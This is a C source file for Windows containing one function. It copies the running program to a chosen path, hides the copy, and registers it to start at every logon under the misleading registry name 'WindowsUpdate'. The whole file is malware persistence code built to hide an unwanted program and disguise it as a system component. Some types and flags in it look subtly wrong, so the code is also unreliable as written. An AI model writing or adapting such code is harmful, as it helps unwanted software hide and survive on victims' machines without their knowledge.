#include "header.h"

void addToAutoRun(LPWSTR filePath)
{
	// Add to register
	LPWSTR currentFilePath[MAX_PATH];
	GetModuleFileName(NULL, currentFilePath, (sizeof(currentFilePath) / sizeof(currentFilePath[0])));

	CopyFile(currentFilePath, filePath, TRUE);
	SetFileAttributes(filePath, FILE_ATTRIBUTE_HIDDEN);

	HKEY hg = NULL;
	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", REG_OPTION_OPEN_LINK, KEY_WRITE, &hg) != ERROR_SUCCESS)
	{
		ExitProcess(1);
	}
	RegSetValueExW(hg, L"WindowsUpdate", 0, REG_SZ, (LPBYTE)filePath, lstrlen(filePath) * sizeof(wchar_t));
	RegCloseKey(hg);
}
